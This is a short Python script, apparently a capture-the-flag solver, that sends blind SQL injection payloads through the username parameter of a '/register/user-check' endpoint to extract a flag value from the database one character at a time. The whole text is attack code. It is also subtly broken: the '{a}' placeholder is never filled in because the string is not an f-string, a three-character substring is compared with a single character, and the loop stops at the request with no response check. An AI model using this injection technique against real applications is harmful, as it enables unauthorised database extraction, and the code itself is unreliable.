#!/usr/bin/python3

import requests
import time
import string

server = ""
flag = ""

loop =1

while chr(124) not in flag:
    for a in range(48, 126):
        r = requests.get(url="http://"+server+"/register/user-check?username=test111' or SUBSTRING((SELECT flag FROM flag LIMIT+0,1),1,3) = '{a}'-- -")
        